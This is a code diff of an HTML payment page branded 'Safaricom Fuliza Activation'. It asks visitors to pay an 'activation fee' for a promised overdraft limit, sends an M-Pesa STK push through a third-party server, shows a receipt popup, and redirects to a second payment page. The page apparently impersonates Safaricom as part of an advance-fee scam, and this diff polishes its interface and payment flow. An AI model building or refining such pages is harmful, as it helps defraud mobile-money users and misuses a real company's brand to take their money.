@@ -5,18 +5,85 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Activate Your Fuliza Limit</title>
 <style>
-body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
-.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
-.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
-.info{margin:10px 0;font-size:16px;}
-input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
-.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
-.pay-btn:hover{background:#179937;}
-.spinner{margin-top:15px;display:none;}
-.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.message{margin-top:15px;font-size:14px;color:#555;}
-.encourage{margin-top:20px;font-size:14px;color:#555;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}
+
+.top-bar{background:linear-gradient(135deg,#1fb141,#16903a);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
+
+.payment-box{max-width:430px;margin:50px auto 30px;background:#fff;padding:32px 28px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);text-align:center;}
+.payment-box h2{color:#1a1a2e;font-size:20px;margin-bottom:10px;}
+
+.info-row{display:flex;justify-content:space-between;align-items:center;background:#f8fffe;border:1px solid #d4edda;border-radius:8px;padding:10px 14px;margin:6px 0;font-size:15px;color:#333;}
+.info-row strong{color:#1fb141;}
+
+.encourage{margin:16px 0 20px;font-size:13.5px;color:#666;line-height:1.6;}
+
+/* Phone input */
+.phone-wrap{display:flex;align-items:center;border:2px solid #ddd;border-radius:10px;overflow:hidden;margin-top:4px;transition:border-color .2s;}
+.phone-wrap:focus-within{border-color:#1fb141;}
+.phone-wrap.invalid{border-color:#e74c3c;}
+.phone-wrap.valid{border-color:#1fb141;}
+.phone-prefix{background:#e8f5e9;color:#1fb141;font-weight:700;font-size:16px;padding:13px 12px;border-right:2px solid #ddd;white-space:nowrap;user-select:none;}
+.phone-input{flex:1;border:none;outline:none;padding:13px 12px;font-size:16px;color:#333;background:transparent;}
+.phone-status{padding:0 12px;font-size:18px;}
+.phone-hint{font-size:12px;color:#888;margin-top:5px;text-align:left;}
+
+.pay-btn{margin-top:20px;width:100%;padding:15px;background:linear-gradient(135deg,#1fb141,#16903a);border:none;color:#fff;font-size:16px;font-weight:600;border-radius:30px;cursor:pointer;transition:transform .15s,box-shadow .15s;letter-spacing:.3px;}
+.pay-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 20px rgba(31,177,65,.4);}
+.pay-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+
+.spinner{margin-top:18px;display:none;flex-direction:column;align-items:center;gap:8px;}
+.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:34px;height:34px;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.spinner-text{font-size:13px;color:#666;}
+
+.status-msg{margin-top:14px;font-size:14px;font-weight:500;padding:10px 14px;border-radius:8px;display:none;}
+.status-msg.info{background:#e8f5e9;color:#1a7a35;}
+.status-msg.error{background:#fdecea;color:#c0392b;}
+
+/* Overlay */
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);z-index:1000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;}
+.overlay.show{opacity:1;pointer-events:all;}
+
+/* Popup card */
+.popup{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:480px;padding:0 0 30px;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,1.15,.6,1);box-shadow:0 -8px 40px rgba(0,0,0,.25);}
+.overlay.show .popup{transform:translateY(0);}
+
+.popup-header{border-radius:22px 22px 0 0;padding:28px 24px 22px;text-align:center;position:relative;}
+.popup-header.success{background:linear-gradient(135deg,#1fb141,#16903a);}
+.popup-header.failure{background:linear-gradient(135deg,#e74c3c,#c0392b);}
+.popup-icon{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:30px;}
+.popup-title{color:#fff;font-size:20px;font-weight:700;}
+.popup-subtitle{color:rgba(255,255,255,.85);font-size:13.5px;margin-top:4px;}
+
+.receipt-body{padding:20px 24px 0;}
+.receipt-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-label{color:#888;font-weight:500;}
+.receipt-value{color:#1a1a2e;font-weight:600;text-align:right;max-width:60%;}
+
+.purpose-note{margin:16px 24px 0;background:#f0fff4;border-left:4px solid #1fb141;border-radius:4px;padding:10px 14px;font-size:13px;color:#2d7a4a;line-height:1.5;}
+.purpose-note.failure-note{background:#fff5f5;border-left-color:#e74c3c;color:#8b0000;}
+
+/* Countdown */
+.countdown-wrap{margin:20px 24px 0;text-align:center;}
+.countdown-text{font-size:13.5px;color:#666;margin-bottom:8px;}
+.countdown-text span{font-weight:700;color:#1fb141;font-size:16px;}
+.progress-bar-bg{background:#e8f5e9;border-radius:100px;height:6px;overflow:hidden;}
+.progress-bar-fill{background:linear-gradient(90deg,#1fb141,#16903a);height:100%;border-radius:100px;transition:width 1s linear;}
+
+.popup-actions{display:flex;gap:12px;padding:20px 24px 0;}
+.btn-proceed{flex:1;padding:14px;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;}
+.btn-proceed:hover{transform:translateY(-2px);box-shadow:0 4px 14px rgba(31,177,65,.4);}
+.btn-retry{flex:1;padding:14px;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s;}
+.btn-retry:hover{transform:translateY(-2px);}
+.btn-close{flex:1;padding:14px;background:#fff;color:#555;border:2px solid #ddd;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:border-color .15s;}
+.btn-close:hover{border-color:#aaa;}
+
+@media(max-width:480px){
+  .payment-box{margin:20px 12px;padding:24px 18px;}
+  .popup{border-radius:18px 18px 0 0;}
+}
 </style>
 </head>
 <body>
@@ -24,136 +91,306 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 <header class="top-bar">Safaricom Fuliza Activation</header>
 
 <div class="payment-box">
-<h2>Activate Your Fuliza Limit Now</h2>
+  <h2>Activate Your Fuliza Limit Now</h2>
 
-<p class="encourage">
-Pay your activation fee today to unlock your desired Fuliza limit instantly.  
-Only Kenyan numbers are accepted for this payment. Numbers starting with <b>07</b> or <b>01</b> will be automatically converted to <b>+254</b>.
-</p>
+  <p class="encourage">
+    Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds.
+  </p>
 
-<div class="info">Selected Limit: <strong id="limit"></strong></div>
-<div class="info">Activation Fee: <strong id="fee"></strong></div>
+  <div class="info-row">Selected Limit: <strong id="limit">—</strong></div>
+  <div class="info-row">Activation Fee: <strong id="fee">—</strong></div>
 
-<input type="tel" id="phone" placeholder="Enter your Kenyan phone number (+2547xxxxxxx)">
+  <div style="margin-top:18px;text-align:left;">
+    <label style="font-size:14px;font-weight:600;color:#444;">Safaricom Phone Number</label>
+    <div class="phone-wrap" id="phoneWrap">
+      <span class="phone-prefix">254</span>
+      <input class="phone-input" type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="tel">
+      <span class="phone-status" id="phoneStatus"></span>
+    </div>
+    <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
+  </div>
 
-<button class="pay-btn" onclick="payNow()">Pay Activation Fee Now</button>
+  <button class="pay-btn" id="payBtn" onclick="payNow()">Pay Activation Fee Now</button>
 
-<div class="spinner" id="spinner"><div class="loader"></div></div>
-<div class="message" id="message"></div>
+  <div class="spinner" id="spinner">
+    <div class="loader"></div>
+    <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>
+  </div>
 
-<p class="encourage">
-Complete the payment to enjoy your increased Fuliza limit immediately.
-</p>
+  <div class="status-msg" id="statusMsg"></div>
+
+  <p class="encourage" style="margin-top:22px;">
+    Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.
+  </p>
+</div>
+
+<!-- Success Popup -->
+<div class="overlay" id="successOverlay">
+  <div class="popup">
+    <div class="popup-header success">
+      <div class="popup-icon">✅</div>
+      <div class="popup-title">Payment Successful!</div>
+      <div class="popup-subtitle">Your Fuliza activation is confirmed</div>
+    </div>
+    <div class="receipt-body" id="receiptBody">
+      <div class="receipt-row"><span class="receipt-label">Receipt No.</span><span class="receipt-value" id="rReceiptNo">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Amount Paid</span><span class="receipt-value" id="rAmount">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Phone</span><span class="receipt-value" id="rPhone">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Date &amp; Time</span><span class="receipt-value" id="rDate">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Status</span><span class="receipt-value" style="color:#1fb141;">Completed ✓</span></div>
+    </div>
+    <div class="purpose-note" id="rPurpose">Payment for: Fuliza Limit Activation</div>
+    <div class="countdown-wrap">
+      <div class="countdown-text">Redirecting to next step in <span id="countdownNum">10</span>s</div>
+      <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:100%;"></div></div>
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="goNext()">Proceed Now →</button>
+    </div>
+  </div>
+</div>
+
+<!-- Failure Popup -->
+<div class="overlay" id="failureOverlay">
+  <div class="popup">
+    <div class="popup-header failure">
+      <div class="popup-icon">❌</div>
+      <div class="popup-title">Payment Failed</div>
+      <div class="popup-subtitle" id="failureSubtitle">Your payment could not be completed</div>
+    </div>
+    <div class="purpose-note failure-note" id="failureReason">Please check your M-Pesa PIN and M-Pesa balance, then try again.</div>
+    <div class="popup-actions">
+      <button class="btn-retry" onclick="retryPayment()">↩ Try Again</button>
+      <button class="btn-close" onclick="closeFailure()">Close</button>
+    </div>
+  </div>
 </div>
 
 <script>
-const selectedAmount = localStorage.getItem("selectedAmount") || 1000;
-const activationFee = localStorage.getItem("activationFee") || 50;
+const BACKEND = "https://mpayafrica-server.onrender.com";
 
+const selectedAmount = localStorage.getItem("selectedAmount") || "—";
+const activationFee  = localStorage.getItem("activationFee")  || "—";
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
-document.getElementById("fee").innerText = "KSh " + activationFee;
+document.getElementById("fee").innerText   = "KSh " + activationFee;
 
-// Only Kenya supported
-const defaultNetwork = 'MPESA';
+const phoneInput  = document.getElementById("phone");
+const phoneWrap   = document.getElementById("phoneWrap");
+const phoneStatus = document.getElementById("phoneStatus");
+const phoneHint   = document.getElementById("phoneHint");
 
-// Convert number to +254 if needed
-function normalizePhone(input){
-  let phone = input.trim();
-  if(phone.startsWith('+254')) return phone; // Already in correct format
-  if(phone.startsWith('07') || phone.startsWith('01')) return '+254' + phone.substring(1);
-  if(phone.startsWith('254')) return '+' + phone;
-  return null; // Invalid number
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 9);
+  validatePhoneUI(phoneInput.value);
+});
+
+function validatePhoneUI(val) {
+  if (val.length === 0) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = "Enter 9 digits after 254 — must start with 7 (e.g. 712345678)";
+    return false;
+  }
+  if (val.length < 9) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;
+    return false;
+  }
+  if (!val.startsWith("7")) {
+    phoneWrap.className = "phone-wrap invalid";
+    phoneStatus.innerText = "✗";
+    phoneStatus.style.color = "#e74c3c";
+    phoneHint.style.color = "#e74c3c";
+    phoneHint.innerText = "Must start with 7 — Safaricom only (e.g. 7XXXXXXXX)";
+    return false;
+  }
+  phoneWrap.className = "phone-wrap valid";
+  phoneStatus.innerText = "✓";
+  phoneStatus.style.color = "#1fb141";
+  phoneHint.style.color = "#1fb141";
+  phoneHint.innerText = "Valid Safaricom number ✓";
+  return true;
 }
 
-function setButtonState(enabled){
-  document.querySelector(".pay-btn").disabled = !enabled;
+function showStatus(msg, type) {
+  const el = document.getElementById("statusMsg");
+  el.innerText = msg;
+  el.className = "status-msg " + type;
+  el.style.display = "block";
 }
 
-async function payNow(){
-  const phoneInput = document.getElementById("phone").value;
-  const msg = document.getElementById("message");
-  const spinner = document.getElementById("spinner");
+function hideStatus() {
+  document.getElementById("statusMsg").style.display = "none";
+}
 
-  msg.innerText = "";
-  const phoneToSend = normalizePhone(phoneInput);
-  if(!phoneToSend){
-    msg.innerText = "Invalid Kenyan number. Use 07xxxxxxxx or +2547xxxxxxxx format.";
-    msg.style.color = "red";
+function setSpinner(show, text) {
+  const s = document.getElementById("spinner");
+  s.style.display = show ? "flex" : "none";
+  if (text) document.getElementById("spinnerText").innerText = text;
+}
+
+function setPayBtn(disabled) {
+  document.getElementById("payBtn").disabled = disabled;
+}
+
+let pollInterval = null;
+let redirectTimer = null;
+
+async function payNow() {
+  const digits = phoneInput.value.trim();
+  if (!validatePhoneUI(digits)) {
+    showStatus("Please enter a valid Safaricom number (starts with 7, 9 digits after 254).", "error");
     return;
   }
 
-  spinner.style.display = "block";
-  setButtonState(false);
-  msg.innerText = "Waiting for STK Push to be initiated... please check your phone.";
-  msg.style.color = "black";
+  const fullPhone = "254" + digits;
+  const amount = Number(activationFee) || 0;
+  if (!amount || amount <= 0) {
+    showStatus("No activation fee found. Please go back and select your limit.", "error");
+    return;
+  }
 
-  try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/deposit", {
+  hideStatus();
+  setSpinner(true, "Sending STK Push to your phone…");
+  setPayBtn(true);
+
+  let data;
+  try {
+    const res = await fetch(BACKEND + "/api/stk-push", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        phone_number: phoneToSend,
-        amount: Number(activationFee),
-        country: 'KE',
-        network: defaultNetwork
-      })
+        amount,
+        phone_number: fullPhone,
+        user_reference: "Fuliza Limit Activation",
+        payment_id: "wallet",
+      }),
     });
-    const data = await res.json();
-    if(data.success){
-      msg.innerText="STK Push sent ✅ Enter your mobile money PIN to confirm...";
-      msg.style.color="green";
-      checkPayment(data.reference, "payment2.html");
-    } else {
-      msg.innerText="Payment initiation failed: " + (data.message || "Try again");
-      msg.style.color="red";
-      setButtonState(true);
-      spinner.style.display = "none";
-    }
-
-  } catch(err){
-    spinner.style.display = "none";
-    msg.innerText="Server error: " + (err.message || "Try again");
-    msg.style.color="red";
-    setButtonState(true);
+    data = await res.json();
+  } catch (err) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");
+    return;
   }
+
+  if (!data.success) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus((data.message || data.error || "Payment initiation failed. Please try again."), "error");
+    return;
+  }
+
+  const checkoutId = data.checkoutRequestId;
+  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");
+  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");
+
+  if (!checkoutId) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");
+    return;
+  }
+
+  startPolling(checkoutId, fullPhone);
 }
 
-async function checkPayment(reference, nextPage){
-  const msg = document.getElementById("message");
+function startPolling(checkoutId, phone) {
   let attempts = 0;
-  const interval = setInterval(async ()=>{
+  const maxAttempts = 40;
+
+  clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
     attempts++;
-    if(attempts > 80){
-      clearInterval(interval);
-      msg.innerText="Payment timeout. Please retry.";
-      msg.style.color="red";
-      setButtonState(true);
+    if (attempts > maxAttempts) {
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      showStatus("Payment timed out. Please try again.", "error");
       return;
     }
-    try{
-      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
+
+    try {
+      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
       const data = await res.json();
-      if(data.success && data.data){
-        const status = (data.data.status || "").toLowerCase();
-        if(status==="success"){
-          clearInterval(interval);
-          msg.innerText="Payment successful ✅ Redirecting...";
-          msg.style.color="green";
-          setTimeout(()=>{ window.location.href = nextPage }, 2000);
-        } else if(status==="failed" || status==="cancelled"){
-          clearInterval(interval);
-          msg.innerText="Payment failed: " + (data.data.message || status);
-          msg.style.color="red";
-          setButtonState(true);
-        } else if(status==="pending"){
-          msg.innerText="Payment pending... please check your phone and enter your PIN.";
-          msg.style.color="black";
-        }
+
+      if (data.status === "pending") return;
+
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+
+      if (data.status === "success" && data.receipt) {
+        showSuccessPopup(data.receipt, phone);
+      } else {
+        showFailurePopup(data.reason || "Payment was not completed. Please try again.");
       }
-    } catch(e){}
-  },3000);
+    } catch (_) {}
+  }, 3000);
+}
+
+function showSuccessPopup(receipt, fallbackPhone) {
+  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";
+  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || activationFee);
+  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";
+  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");
+  document.getElementById("rPurpose").innerText   = "Payment for: " + (receipt.purpose || "Fuliza Limit Activation");
+
+  const overlay = document.getElementById("successOverlay");
+  overlay.classList.add("show");
+
+  startCountdown(10);
+}
+
+function startCountdown(seconds) {
+  clearTimeout(redirectTimer);
+  const total = seconds;
+  let remaining = seconds;
+
+  document.getElementById("countdownNum").innerText = remaining;
+  document.getElementById("progressFill").style.width = "100%";
+
+  const tick = () => {
+    remaining--;
+    document.getElementById("countdownNum").innerText = remaining;
+    const pct = (remaining / total) * 100;
+    document.getElementById("progressFill").style.width = pct + "%";
+
+    if (remaining <= 0) {
+      goNext();
+      return;
+    }
+    redirectTimer = setTimeout(tick, 1000);
+  };
+
+  redirectTimer = setTimeout(tick, 1000);
+}
+
+function goNext() {
+  clearTimeout(redirectTimer);
+  window.location.href = "payment2.html";
+}
+
+function showFailurePopup(reason) {
+  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";
+  document.getElementById("failureOverlay").classList.add("show");
+}
+
+function retryPayment() {
+  document.getElementById("failureOverlay").classList.remove("show");
+  setPayBtn(false);
+  hideStatus();
+  clearInterval(pollInterval);
+  clearTimeout(redirectTimer);
+}
+
+function closeFailure() {
+  document.getElementById("failureOverlay").classList.remove("show");
 }
 </script>
-
 </body>
 </html>
